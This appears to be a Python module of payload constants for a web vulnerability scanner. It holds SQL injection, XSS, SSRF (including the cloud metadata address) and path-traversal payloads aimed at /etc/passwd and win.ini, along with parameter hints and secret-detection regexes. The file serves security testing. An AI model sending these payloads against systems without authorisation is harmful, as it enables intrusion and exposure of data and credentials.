"""Payload definitions for non-destructive vulnerability detection."""

SQLI_ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
]

# Delays are intentionally short to reduce target impact.
SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(3)-- ",
    "'; WAITFOR DELAY '0:0:3'--",
    "' || pg_sleep(3)--",
    "' OR 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('bbscan',3) ELSE 1 END FROM dual)--",
]

SQLI_TIME_DIFF_PAIRS = [
    {
        "name": "mysql_sleep",
        "true": "' OR IF(1=1,SLEEP(3),0)-- ",
        "false": "' OR IF(1=0,SLEEP(3),0)-- ",
    },
    {
        "name": "postgres_sleep",
        "true": "' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(3) END) IS NULL--",
        "false": "' OR (SELECT CASE WHEN 1=0 THEN pg_sleep(3) END) IS NULL--",
    },
    {
        "name": "oracle_dbms_pipe",
        "true": "' OR 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('bbscan',3) ELSE 1 END FROM dual)--",
        "false": "' OR 1=(SELECT CASE WHEN 1=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('bbscan',3) ELSE 1 END FROM dual)--",
    },
    {
        "name": "mssql_waitfor",
        "true": "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
        "false": "'; IF (1=0) WAITFOR DELAY '0:0:3'--",
    },
]

SQLI_PARAM_HINTS = {
    "id",
    "custordid",
    "orderid",
    "customerid",
    "custid",
    "accountid",
    "siteid",
    "recordid",
    "userid",
    "name",
    "q",
    "query",
    "search",
    "key",
    "code",
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]

SSRF_TEST_VALUES = [
    "http://127.0.0.1:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080",
]

SSRF_PARAM_HINTS = {
    "url",
    "uri",
    "link",
    "endpoint",
    "callback",
    "return",
    "next",
    "dest",
    "redirect",
    "image",
    "avatar",
    "host",
    "domain",
}

LFI_PARAM_HINTS = {
    "file",
    "path",
    "filepath",
    "filename",
    "document",
    "folder",
    "template",
    "page",
    "include",
    "inc",
    "resource",
    "download",
    "url",
    "uri",
    "src",
}

LFI_FILE_SCHEME_PAYLOADS = [
    "file:///C:/Windows/win.ini",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "file:///etc/passwd",
]

LFI_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../../../../../etc/passwd",
]

LFI_RESPONSE_MARKERS = [
    "; for 16-bit app support",
    "[fonts]",
    "localhost",
    "127.0.0.1",
    "root:x:0:0:",
    "/bin/bash",
]

IDOR_PARAM_HINTS = {"id", "user_id", "account_id", "order_id", "profile_id"}

SQL_ERROR_PATTERNS = [
    "sql syntax",
    "mysql",
    "warning: mysql",
    "unclosed quotation mark",
    "odbc sql",
    "postgresql",
    "sqlite error",
    "sqlstate",
    "ora-",
]

SECRET_PATTERNS = {
    "aws_access_key": r"AKIA[0-9A-Z]{16}",
    "github_token": r"ghp_[A-Za-z0-9]{36}",
    "generic_api_key": r"(?i)(api[_-]?key|token|secret|password)\s*[:=]\s*['\"][A-Za-z0-9_\-\./+=]{16,}['\"]",
    "slack_token": r"xox[baprs]-[A-Za-z0-9\-]{10,48}",
    "private_key_header": r"-----BEGIN (?:RSA|EC|OPENSSH|DSA)? ?PRIVATE KEY-----",
}

ENDPOINT_PATTERN = r"https?://[A-Za-z0-9\.-]+(?::\d+)?(?:/[A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]*)?"
